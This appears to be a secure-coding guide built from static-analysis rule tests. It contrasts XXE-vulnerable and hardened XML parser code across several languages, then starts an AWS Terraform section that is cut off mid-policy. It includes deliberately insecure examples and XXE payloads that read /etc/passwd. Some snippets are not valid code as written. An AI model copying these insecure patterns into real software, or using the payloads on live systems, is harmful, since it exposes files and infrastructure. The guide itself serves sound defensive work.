- [Semgrep Java XXE Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/java-xxe/)

---

**Incorrect: vulnerable to XXE**

```java
class BadSAXParserFactory{
    public void BadSAXParserFactory() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        //ruleid:saxparserfactory-disallow-doctype-decl-missing
        spf.newSAXParser();
    }

    public void BadSAXParserFactory2() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("somethingElse", true);
        //ruleid:saxparserfactory-disallow-doctype-decl-missing
        spf.newSAXParser();
    }
}
```

**Correct: XXE disabled**

```java
class GoodSAXParserFactory {
    public void GoodSAXParserFactory() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        //ok:saxparserfactory-disallow-doctype-decl-missing
        spf.newSAXParser();
    }

    public void GoodSAXParserFactory2() throws  ParserConfigurationException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        //ok:saxparserfactory-disallow-doctype-decl-missing
        spf.newSAXParser();
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Semgrep Java XXE Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3a-documentbuilderfactory)

---

**Incorrect: vulnerable to XXE**

```java
class TransformerFactory {
    public void BadTransformerFactory() {
        TransformerFactory factory = TransformerFactory.newInstance();
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        //ruleid:transformerfactory-dtds-not-disabled
        factory.newTransformer(new StreamSource(xyz));
    }

    public void BadTransformerFactory2() {
        TransformerFactory factory = TransformerFactory.newInstance();
        factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalDTD", "");
        //ruleid:transformerfactory-dtds-not-disabled
        factory.newTransformer(new StreamSource(xyz));
    }
}
```

**Correct: XXE disabled**

```java
class TransformerFactory {
    public void GoodTransformerFactory() {
        TransformerFactory factory = TransformerFactory.newInstance();
        //ok:transformerfactory-dtds-not-disabled
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
        factory.newTransformer(new StreamSource(xyz));
    }

    public void GoodTransformerFactory3() {
        TransformerFactory factory = TransformerFactory.newInstance();
        //ok:transformerfactory-dtds-not-disabled
        factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalStylesheet", "");
        factory.setAttribute("http://javax.xml.XMLConstants/property/accessExternalDTD", "");
        factory.newTransformer(new StreamSource(xyz));
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Apache Xerces Features](https://xerces.apache.org/xerces2-j/features.html)

---

**Incorrect: vulnerable to XXE**

```java
public class XmlDecodeUtil {
    // ruleid: xml-decoder
    public static Object handleXml(InputStream in) {
        XMLDecoder d = new XMLDecoder(in);
        try {
            Object result = d.readObject(); //Deserialization happen here
            return result;
        }
        finally {
            d.close();
        }
    }
}
```

**Correct: safe usage**

```java
public class XmlDecodeUtil {
    // ok: xml-decoder
    public static Object handleXml1() {
        XMLDecoder d = new XMLDecoder("<safe>XML</safe>");
        try {
            Object result = d.readObject();
            return result;
        }
        finally {
            d.close();
        }
    }

    // ok: xml-decoder
    public static Object handleXml2() {
        String strXml = "<safe>XML</safe>";
        XMLDecoder d = new XMLDecoder(strXml);
        try {
            Object result = d.readObject();
            return result;
        }
        finally {
            d.close();
        }
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

**Incorrect: vulnerable to XXE**

```javascript
function test1(body) {
    // ruleid: xml2json-xxe
    const xml2json = require('xml2json')
    const result = xml2json.toJson(body, { object: true, arrayNotation: true })
    return result
}
```

**Correct: safe usage**

```javascript
function okTest1() {
    // ok: xml2json-xxe
    const xml2json = require('xml2json')
    const result = xml2json.toJson('<xml></xml>', { object: true, arrayNotation: true })
    return result
}

function okTest1() {
    // ok: xml2json-xxe
    const xml2json = require('xml2json')
    let body = '<xml></xml>'
    const result = xml2json.toJson(body, { object: true, arrayNotation: true })
    return result
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

---

**Incorrect: vulnerable to XXE**

```javascript
function test1(input) {
    // ruleid: expat-xxe
    var expat = require('node-expat')
    var parser = new expat.Parser('UTF-8')
    parser.parse(input)
}

function test2(input) {
    // ruleid: expat-xxe
    const {Parser} = require('node-expat')
    const parser = new Parser('UTF-8')
    parser.write(input)
}
```

**Correct: safe usage**

```javascript
function okTest3() {
    // ok: expat-xxe
    var expat = require('node-expat')
    var parser = new expat.Parser('UTF-8')
    parser.parse("safe input")
}

function okTest4() {
    // ok: expat-xxe
    const {Parser} = require('node-expat')
    const parser = new Parser('UTF-8')
    const x = "safe input"
    parser.write(x)
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

---

**Incorrect: vulnerable to XXE**

```javascript
function test1() {
    // ruleid: sax-xxe
    var sax = require("sax"),
    strict = false,
    parser = sax.parser(strict);

    parser.onattribute = function (attr) {
        doSmth(attr)
    };

    parser.ondoctype = function(dt) {
        processDocType(dt)
    }

    const xml = `<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <username>&xxe;</username>`;

    parser.write(xml).close();
}

function test2() {
    // ruleid: sax-xxe
    var saxStream = require("sax").createStream(strict, options)

    saxStream.on("opentag", function (node) {
        // same object as above
    })

    saxStream.on("doctype", function (node) {
        processType(node)
    })

    fs.createReadStream("file.xml")
        .pipe(saxStream)
        .pipe(fs.createWriteStream("file-copy.xml"))
}
```

**Correct: safe usage**

```javascript
function okTest1() {
    // ok: sax-xxe
    var saxStream = require("sax").createStream(strict, options)

    saxStream.on("ontext", function (node) {
        // same object as above
    })

    fs.createReadStream("file.xml").pipe(saxStream).pipe(fs.createWriteStream("file-copy.xml"))
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [sax-js on GitHub](https://github.com/isaacs/sax-js)

- [node-xml2js Issue #415](https://github.com/Leonidas-from-XIV/node-xml2js/issues/415)

---

**Incorrect: vulnerable to XXE**

```javascript
function test1() {
    const express = require('express')
    const xml2json = require('xml2json')
    const app = express()
    const port = 3000

    app.get('/', (req, res) => {
        const xml = req.query.xml
        // ruleid: express-xml2json-xxe
        const content = xml2json.toJson(xml, {coerce: true, object: true});
        res.send(content)
    })

    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
}

function test2() {
    const express = require('express')
    const xml2json = require('xml2json')
    const app = express()
    const port = 3000

    app.get('/', (req, res) => {
        // ruleid: express-xml2json-xxe
        const content = xml2json.toJson(req.body, {coerce: true, object: true});
        res.send(content)
    })

    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
}
```

**Correct: safe usage**

```javascript
function okTest() {
    const express = require('express')
    const xml2json = require('xml2json')
    const app = express()
    const port = 3000

    app.get('/', (req, res) => {
        // ok: express-xml2json-xxe
        const content = expat.toJson(someVerifiedData(), {coerce: true, object: true});
        res.send(content)
    })

    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [xml2json on npm](https://www.npmjs.com/package/xml2json)

---

**Incorrect: vulnerable to XXE**

```javascript
const express = require('express')
const app = express()
const port = 3000
const expat = require('node-expat');

app.get('/test', async (req, res) => {
    var parser = new expat.Parser('UTF-8')
    // ruleid: express-expat-xxe
    parser.parse(req.body)
    res.send('Hello World!')
})

app.get('/test1', async (req, res) => {
    var parser = new expat.Parser('UTF-8')
    // ruleid: express-expat-xxe
    parser.write(req.query.value)
    res.send('Hello World!')
})

app.get('/test2', async (req, res) => {
    var parser = new expat.Parser('UTF-8')
    var data = req.body.foo
    // ruleid: express-expat-xxe
    parser.write(data)
    res.send('Hello World!')
})
```

**Correct: safe usage**

```javascript
app.get('/okTest1', async (req, res) => {
    var parser = new expat.Parser('UTF-8')
    // ok: express-expat-xxe
    parser.write('<xml>hardcoded</xml>')
    res.send('Hello World!')
})

app.get('/okTest2', async (req, res) => {
    var parser = new expat.Parser('UTF-8')
    var data = foo()
    // ok: express-expat-xxe
    parser.write(data)
    res.send('Hello World!')
})
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [node-expat on GitHub](https://github.com/astro/node-expat)

---

**Incorrect: vulnerable to XXE**

```javascript
var libxmljs = require("libxmljs");
var libxmljs2 = require("libxmljs2");

module.exports.foo =  function(req, res) {
    // ruleid: express-libxml-noent
    libxmljs.parseXmlString(req.files.products.data.toString('utf8'), {noent:true,noblanks:true})
    // ruleid: express-libxml-noent
    libxmljs.parseXml(req.query.products, {noent:true,noblanks:true})
    // ruleid: express-libxml-noent
    libxmljs2.parseXmlString(req.body, {noent:true,noblanks:true})
    // ruleid: express-libxml-noent
    libxmljs2.parseXml(req.body, {noent:true,noblanks:true})
}
```

**Correct: XXE disabled**

```javascript
module.exports.foo =  function(req, res) {
    // ok: express-libxml-noent
    libxmljs.parseXml(req.files.products.data.toString('utf8'), {noent:false,noblanks:true})
    // ok: express-libxml-noent
    libxmljs2.parseXml(req.body, {noent:false,noblanks:true})
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

**Incorrect: vulnerable to XXE**

```javascript
function handleXmlUpload ({ file }: Request, res: Response, next: NextFunction) {
  if (utils.endsWith(file?.originalname.toLowerCase(), '.xml')) {
    if (file?.buffer && !utils.disableOnContainerEnv()) {
      const data = file.buffer.toString()
      try {
        const sandbox = { libxml, data }
        vm.createContext(sandbox)

        // ruleid: express-libxml-vm-noent
        const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })

        // ruleid: express-libxml-vm-noent
        libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })

        const xml_opts = { noblanks: true, noent: true, nocdata: true }
        // ruleid: express-libxml-vm-noent
        libxml.parseXml(data, xml_opts)
      }
    }
  }
}
```

**Correct: XXE disabled**

```javascript
function handleXmlUpload ({ file }: Request, res: Response, next: NextFunction) {
    // ok: express-libxml-vm-noent
    libxml.parseXml(data, { noblanks: true, nocdata: true })
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

**Incorrect: vulnerable to XXE**

```javascript
const expat = require('xml2json');

function test1() {
    var winston = require('winston'),
        express = require('express');

    var xmlParsingMiddleware = function(req, res, next) {
        var buf = '';
        req.setEncoding('utf8');
        req.on('data', function (chunk) {
            buf += chunk
        });
        // ruleid: express-xml2json-xxe-event
        req.on('end', function () {
            req.body = expat.toJson(buf, {coerce: true, object: true});
            next();
        });
    };
}
```

**Correct: safe usage**

```javascript
function okTest() {
    const express = require('express')
    const app = express()
    const port = 3000
    const someEvent = require('some-event')

    // ok: express-xml2json-xxe-event
    someEvent.on('event', function (err, data) {
        req.body = expat.toJson(data, {coerce: true, object: true});
        next();
    });

    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [xml2json on npm](https://www.npmjs.com/package/xml2json)

---

**Incorrect: vulnerable to XXE**

```python
def bad():
    # ruleid: use-defused-xml
    import xml
    # ruleid: use-defused-xml
    from xml.etree import ElementTree
    tree = ElementTree.parse('country_data.xml')
    root = tree.getroot()
```

**Correct: safe usage**

```python
def ok():
    # ok: use-defused-xml
    import defusedxml
    # ok: use-defused-xml
    from defusedxml.etree import ElementTree
    tree = ElementTree.parse('country_data.xml')
    root = tree.getroot()
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Python xml Documentation](https://docs.python.org/3/library/xml.html)

- [defusedxml on GitHub](https://github.com/tiran/defusedxml)

- [OWASP XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

---

**Incorrect: vulnerable to XXE**

```python
def bad(input_string):
    # ok: use-defused-xml-parse
    import xml
    # ok: use-defused-xml-parse
    from xml.etree import ElementTree
    tree = ElementTree.parse('country_data.xml')
    root = tree.getroot()

    # ruleid: use-defused-xml-parse
    tree = ElementTree.parse(input_string)
```

**Correct: safe usage**

```python
def ok():
    # ok: use-defused-xml-parse
    import defusedxml
    # ok: use-defused-xml-parse
    from defusedxml.etree import ElementTree
    tree = ElementTree.parse('country_data.xml')
    root = tree.getroot()

    # ok: use-defused-xml-parse
    tree = ElementTree.parse(input_string)
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [Python xml Documentation](https://docs.python.org/3/library/xml.html)

- [defusedxml on GitHub](https://github.com/tiran/defusedxml)

---

**Incorrect: vulnerable to XML injection**

```python
from twilio.rest import Client

client = Client("accountSid", "authToken")
XML = "<Response><Say>{}</Say><Hangup/></Response>"

def fstring(to: str, msg: str) -> None:
    client.calls.create(
        # ruleid: twiml-injection
        twiml=f"<Response><Say>{msg}</Say><Hangup/></Response>",
        to=to,
        from_="555-555-5555",
    )

def format_const(to: str, msg: str) -> None:
    twiml = XML.format(msg)
    client.calls.create(
        # ruleid: twiml-injection
        twiml=twiml,
        to=to,
        from_="555-555-5555",
    )

def percent(to: str, msg: str) -> None:
    client.calls.create(
        # ruleid: twiml-injection
        twiml="<Response><Say>%s</Say><Hangup/></Response>" % msg,
        to=to,
        from_="555-555-5555",
    )

def concat(to: str, msg: str) -> None:
    client.calls.create(
        # ruleid: twiml-injection
        twiml="<Response><Say>" + msg + "</Say><Hangup/></Response>",
        to=to,
        from_="555-555-5555",
    )
```

**Correct: safe usage**

```python
import html
from xml.sax.saxutils import escape

def safe(to: str, msg: str) -> None:
    client.calls.create(
        # ok: twiml-injection
        twiml="<Response><Say>nsec</Say><Hangup/></Response>",
        to=to,
        from_="555-555-5555",
    )

def html_escape(to: str, msg: str) -> None:
    client.calls.create(
        # ok: twiml-injection
        twiml="<Response><Say>" + html.escape(msg) + "</Say><Hangup/></Response>",
        to=to,
        from_="555-555-5555",
    )

def xml_escape(to: str, msg: str) -> None:
    client.calls.create(
        # ok: twiml-injection
        twiml="<Response><Say>" + escape(msg) + "</Say><Hangup/></Response>",
        to=to,
        from_="555-555-5555",
    )
```

**References:**

- CWE-91: XML Injection

- [Funjection Research](https://codeberg.org/fennix/funjection)

---

**Incorrect: vulnerable to XXE**

```ruby
require 'xml'
require 'libxml'

# ruleid: libxml-backend
ActiveSupport::XmlMini.backend = 'LibXML'
```

**Correct: safe usage**

```ruby
require 'xml'
require 'libxml'

# ok: libxml-backend
ActiveSupport::XmlMini.backend = 'REXML'

# ok: libxml-backend
ActiveSupport::XmlMini.backend = 'Nokogiri'

# Deny entity replacement in LibXML parsing
LibXML::XML.class_eval do
  def self.default_substitute_entities
    XML.default_substitute_entities = false
  end
end
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [StackHawk: Rails XXE Guide](https://www.stackhawk.com/blog/rails-xml-external-entities-xxe-guide-examples-and-prevention/)

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

**Incorrect: vulnerable to XXE**

```ruby
require 'xml'
require 'libxml'

# Change the ActiveSupport XML backend from REXML to LibXML
ActiveSupport::XmlMini.backend = 'LibXML'

LibXML::XML.class_eval do
  def self.default_substitute_entities
    # ruleid: xml-external-entities-enabled
    XML.default_substitute_entities = true
  end
end
```

**Correct: XXE disabled**

```ruby
LibXML::XML.class_eval do
  def self.default_substitute_entities
    # ok: xml-external-entities-enabled
    XML.default_substitute_entities = false
  end
end
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [StackHawk: Rails XXE Guide](https://www.stackhawk.com/blog/rails-xml-external-entities-xxe-guide-examples-and-prevention/)

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

**Incorrect: vulnerable to XXE**

```csharp
public class Foo{
    public void LoadBad(string input)
    {
        string fileName = @"C:\Users\user\Documents\test.xml";
        XmlDocument xmlDoc = new XmlDocument();
        xmlDoc.XmlResolver = new XmlUrlResolver();
        // ruleid: xmldocument-unsafe-parser-override
        xmlDoc.Load(input);
        Console.WriteLine(xmlDoc.InnerText);

        Console.ReadLine();
    }

    public static void StaticLoadBad(string input)
    {
        string fileName = @"C:\Users\user\Documents\test.xml";
        XmlDocument xmlDoc = new XmlDocument();
        xmlDoc.XmlResolver = new XmlUrlResolver();
        // ruleid: xmldocument-unsafe-parser-override
        xmlDoc.Load(input);
        Console.WriteLine(xmlDoc.InnerText);

        Console.ReadLine();
    }
}
```

**Correct: XXE disabled**

```csharp
public class Foo{
    public void LoadGood(string input)
    {
        XmlDocument xmlDoc = new XmlDocument();
        // ok: xmldocument-unsafe-parser-override
        xmlDoc.Load(input);
        Console.WriteLine(xmlDoc.InnerText);

        Console.ReadLine();
    }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [XXE and .NET](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/)

- [Microsoft XmlDocument.XmlResolver](https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmldocument.xmlresolver?view=net-6.0#remarks)

---

**Incorrect: vulnerable to XXE**

```csharp
public void ParseBad(string input){
    XmlReaderSettings rs = new XmlReaderSettings();
    rs.DtdProcessing = DtdProcessing.Parse;

    // ruleid:xmlreadersettings-unsafe-parser-override
    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);

    while (myReader.Read())
    {
        Console.WriteLine(myReader.Value);
    }
    Console.ReadLine();
}

public void ParseBad2(string input){
    XmlReaderSettings rs = new XmlReaderSettings();
    rs.DtdProcessing = DtdProcessing.Parse;

    // ruleid:xmlreadersettings-unsafe-parser-override
    XmlReader myReader = XmlReader.Create(input,rs);

    while (myReader.Read())
    {
        Console.WriteLine(myReader.Value);
    }
    Console.ReadLine();
}
```

**Correct: XXE disabled**

```csharp
public void ParseGood(string input){
    XmlReaderSettings rs = new XmlReaderSettings();
    rs.DtdProcessing = DtdProcessing.Ignore;

    // ok: xmlreadersettings-unsafe-parser-override
    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);

    while (myReader.Read())
    {
        Console.WriteLine(myReader.Value);
    }
    Console.ReadLine();
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [XXE and .NET](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/)

---

**Incorrect: vulnerable to XXE**

```csharp
namespace SomeNamespace{
    public class Foo{
        public void ReaderBad(string userInput)
        {
            XmlTextReader myReader = new XmlTextReader(new StringReader(userInput));

            // ruleid: xmltextreader-unsafe-defaults
            while (myReader.Read())
            {
                if (myReader.NodeType == XmlNodeType.Element)
                {
                    // ruleid: xmltextreader-unsafe-defaults
                    Console.WriteLine(myReader.ReadElementContentAsString());
                }
            }
            Console.ReadLine();
        }
    }
}
```

**Correct: XXE disabled**

```csharp
public void ReaderGood(string userInput)
{
    XmlTextReader myReader = new XmlTextReader(new StringReader(userInput));
    myReader.DtdProcessing = DtdProcessing.Prohibit;
    // ok: xmltextreader-unsafe-defaults
    while (myReader.Read())
    {
        if (myReader.NodeType == XmlNodeType.Element)
        {
            // ok: xmltextreader-unsafe-defaults
            Console.WriteLine(myReader.ReadElementContentAsString());
        }
    }
    Console.ReadLine();
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [XXE and .NET](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/)

---

**Incorrect: vulnerable to XXE**

```scala
package org.test.test

import java.io.{File, FileReader}
import javax.xml.stream.XMLInputFactory

class Foo {

  def run1(file: String) = {
    // ruleid: xmlinputfactory-dtd-enabled
    val factory = XMLInputFactory.newInstance()
    val fileReader = new FileReader(file)
    val xmlReader = factory.createXMLStreamReader(fileReader)
    doSmth(xmlReader)
  }

  def run2(file: String) = {
    // ruleid: xmlinputfactory-dtd-enabled
    val factory = XMLInputFactory.newFactory()
    val fileReader = new FileReader(file)
    val xmlReader = factory.createXMLStreamReader(fileReader)
    doSmth(xmlReader)
  }
}
```

**Correct: XXE disabled**

```scala
class Foo {

  def okRun1(file: String) = {
    // ok: xmlinputfactory-dtd-enabled
    val factory = XMLInputFactory.newInstance
    factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false)
    val fileReader = new FileReader(file)
    val xmlReader = factory.createXMLStreamReader(fileReader)
    doSmth(xmlReader)
  }

  def okRun2(file: String) = {
    // ok: xmlinputfactory-dtd-enabled
    val factory = XMLInputFactory.newFactory()
    factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false)
    val fileReader = new FileReader(file)
    val xmlReader = factory.createXMLStreamReader(fileReader)
    doSmth(xmlReader)
  }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

---

**Incorrect: vulnerable to XXE**

```scala
package org.test.test

import java.io.File
import org.dom4j.io.SAXReader
import org.dom4j.{Document}
import javax.xml.parsers.SAXParserFactory

class Foo {

  def run1(xmlFilePath:String) = {
    val file = new File(xmlFilePath)
    // ruleid: sax-dtd-enabled
    val saxReader = new SAXReader()
    val doc = Try(saxReader.read(file))
    result.asInstanceOf[Document]
  }

  def run2(xmlFilePath:String) = {
    val file = new File(xmlFilePath)
    // ruleid: sax-dtd-enabled
    val factory = SAXParserFactory.newInstance()
    val saxReader = factory.newSAXParser()
    val doc = Try(saxReader.read(file))
    result.asInstanceOf[Document]
  }

  def run4(xmlFilePath:String) = {
    val file = new File(xmlFilePath)
    // ruleid: sax-dtd-enabled
    val saxReader = SAXParserFactory.newInstance().newSAXParser()
    val doc = Try(saxReader.read(file))
    result.asInstanceOf[Document]
  }
}
```

**Correct: XXE disabled**

```scala
class Foo {

  def okRun1(xmlFilePath:String) = {
    val file = new File(xmlFilePath)
    // ok: sax-dtd-enabled
    val saxReader = new SAXReader()

    saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false)
    saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

    val doc = Try(saxReader.read(file))
    result.asInstanceOf[Document]
  }

  def okRun2(xmlFilePath:String) = {
    val file = new File(xmlFilePath)
    // ok: sax-dtd-enabled
    val factory = SAXParserFactory.newInstance()
    val saxReader = factory.newSAXParser()

    saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false)
    saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

    val doc = Try(saxReader.read(file))
    result.asInstanceOf[Document]
  }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

---

**Incorrect: vulnerable to XXE**

```scala
package org.test.test

import java.io.File
import javax.xml.parsers.DocumentBuilder
import javax.xml.parsers.DocumentBuilderFactory

class Foo {

  def run1(file: File) = {
    // ruleid: documentbuilder-dtd-enabled
    val docBuilderFactory = DocumentBuilderFactory.newInstance()
    val docBuilder = docBuilderFactory.newDocumentBuilder()
    val doc = docBuilder.parse(file)
    doc.getDocumentElement().normalize()
    val foobarList = doc.getElementsByTagName("Foobar")
    foobarList
  }

  def run2(file: File) = {
    // ruleid: documentbuilder-dtd-enabled
    val docBuilder = DocumentBuilderFactory.newInstance().newDocumentBuilder()
    val doc = docBuilder.parse(file)
    doc.getDocumentElement().normalize()
    val foobarList = doc.getElementsByTagName("Foobar")
    foobarList
  }
}
```

**Correct: XXE disabled**

```scala
class Foo {

  def okRun1(file: File) = {
    // ok: documentbuilder-dtd-enabled
    val docBuilderFactory = DocumentBuilderFactory.newInstance()
    val docBuilder = docBuilderFactory.newDocumentBuilder()

    docBuilder.setXIncludeAware(true)
    docBuilder.setNamespaceAware(true)

    docBuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
    docBuilder.setFeature("http://xml.org/sax/features/external-general-entities", false)
    docBuilder.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

    val doc = docBuilder.parse(file)
    doc.getDocumentElement().normalize()
    val foobarList = doc.getElementsByTagName("Foobar")
    foobarList
  }
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [OWASP A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

---

**Incorrect: vulnerable to XXE**

```go
import (
	"fmt"
	"github.com/lestrrat-go/libxml2/parser"
)

func vuln() {
	const s = "<!DOCTYPE d [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><t>&e;</t>"
	// ruleid: parsing-external-entities-enabled
	p := parser.New(parser.XMLParseNoEnt)
	doc, err := p.ParseString(s)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Doc successfully parsed!")
	fmt.Println(doc)
}
```

**Correct: XXE disabled**

```go
func not_vuln() {
	const s = "<!DOCTYPE d [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><t>&e;</t>"
	// ok: parsing-external-entities-enabled
	p := parser.New()
	doc, err := p.ParseString(s)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Doc successfully parsed!")
	fmt.Println(doc)
}
```

**References:**

- CWE-611: Improper Restriction of XML External Entity Reference

- [SecureFlag: XML Entity Expansion in Go](https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_go_lang.html)

- [OWASP XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

### 0.21 Secure AWS Terraform Configurations

**Impact: HIGH**

This guide provides security best practices for AWS Terraform configurations. Following these patterns helps prevent common security misconfigurations that could expose your infrastructure to attacks.

**Incorrect: EC2 - instance with public IP**

```hcl
# ruleid: aws-ec2-has-public-ip
resource "aws_instance" "public" {
  ami           = "ami-12345"
  instance_type = "t3.micro"

  associate_public_ip_address = true
}
```

**Correct: EC2 - instance without public IP**

```hcl
resource "aws_instance" "private" {
  ami           = "ami-12345"
  instance_type = "t3.micro"

  associate_public_ip_address = false
}
```

**Incorrect: EC2 - launch template with public IP**

```hcl
# ruleid: aws-ec2-has-public-ip
resource "aws_launch_template" "public" {
  image_id      = "ami-12345"
  instance_type = "t3.micro"

  network_interfaces {
    associate_public_ip_address = true
  }
}
```

**Correct: EC2 - launch template without public IP**

```hcl
resource "aws_launch_template" "private" {
  image_id      = "ami-12345"
  instance_type = "t3.micro"

  network_interfaces {
    associate_public_ip_address = false
  }
}
```

**Incorrect: EC2 - security group allowing public SSH access**

```hcl
resource "aws_security_group" "fail_open_1" {
  vpc_id = aws_vpc.example.id

  # ruleid: aws-ec2-security-group-allows-public-ingress
  ingress {
    protocol    = "tcp"
    from_port   = 22
    to_port     = 22
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

**Correct: EC2 - security group with restricted CIDR**

```hcl
resource "aws_security_group" "pass_inside_private_network_1" {
  vpc_id = aws_vpc.example.id

  # ok: aws-ec2-security-group-allows-public-ingress
  ingress {
    protocol    = "tcp"
    from_port   = 22
    to_port     = 22
    cidr_blocks = ["10.0.0.0/8"]
  }
}
```

**Incorrect: EBS - unencrypted volume**

```hcl
# ruleid: aws-ebs-volume-unencrypted
resource "aws_ebs_volume" "fail_1" {
  availability_zone = "us-west-2a"
}

# ruleid: aws-ebs-volume-unencrypted
resource "aws_ebs_volume" "fail_2" {
  availability_zone = "us-west-2a"
  encrypted         = false
}
```

**Correct: EBS - encrypted volume**

```hcl
# ok: aws-ebs-volume-unencrypted
resource "aws_ebs_volume" "pass" {
  availability_zone = "us-west-2a"
  encrypted         = true
}
```

**Incorrect: S3 - object without CMK encryption**

```hcl
# ruleid: aws-s3-bucket-object-encrypted-with-cmk
resource "aws_s3_bucket_object" "fail" {
  bucket       = aws_s3_bucket.object_bucket.bucket
  key          = "tf-testing-obj-%[1]d-encrypted"
  content      = "Keep Calm and Carry On"
  content_type = "text/plain"
}
```

**Correct: S3 - object with CMK encryption**

```hcl
resource "aws_s3_bucket_object" "pass" {
  bucket       = aws_s3_bucket.object_bucket.bucket
  key          = "tf-testing-obj-%[1]d-encrypted"
  content      = "Keep Calm and Carry On"
  content_type = "text/plain"
  kms_key_id   = aws_kms_key.example.arn
}
```

**Incorrect: RDS - without backup retention**

```hcl
# ruleid: aws-rds-backup-no-retention
resource "aws_rds_cluster" "fail2" {
  backup_retention_period = 0
}

# ruleid: aws-rds-backup-no-retention
resource "aws_db_instance" "fail" {
  backup_retention_period = 0
}
```

**Correct: RDS - with backup retention**

```hcl
resource "aws_rds_cluster" "pass" {
  backup_retention_period = 35
}

resource "aws_db_instance" "pass" {
  backup_retention_period = 35
}
```

**Incorrect: IAM - policy with wildcard admin access**

```hcl
resource "aws_iam_policy" "fail3" {
  name = "fail3"
  path = "/"
  # ruleid: aws-iam-admin-policy
  policy = <<POLICY
{
  "Statement": [
    {
